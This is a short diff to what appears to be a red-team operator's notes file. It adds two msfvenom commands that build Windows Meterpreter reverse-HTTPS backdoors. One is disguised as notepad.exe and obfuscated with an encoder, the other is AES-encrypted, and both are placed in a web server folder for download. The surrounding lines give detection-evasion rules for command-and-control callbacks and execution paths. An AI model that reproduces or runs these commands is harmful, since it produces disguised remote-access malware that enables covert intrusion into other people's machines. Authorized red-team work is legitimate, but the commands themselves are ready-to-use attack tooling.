@@ -3,3 +3,11 @@
 - Do not execute from non-executable locations. Executable locations are C:\ProgramData, C:\Program Files, C:\Windows. Execution from locations such as C:\Windows\Temp should never occur or be used with an understanding of risk.
 - Minimize callback (C2) volume
 - Do not attempt to exploit or attack unencrypted websites or applications. 
+#Payload Generated with metasploit:
+
+1. sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=# LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe
+
+2. sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=# LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
+
+
+
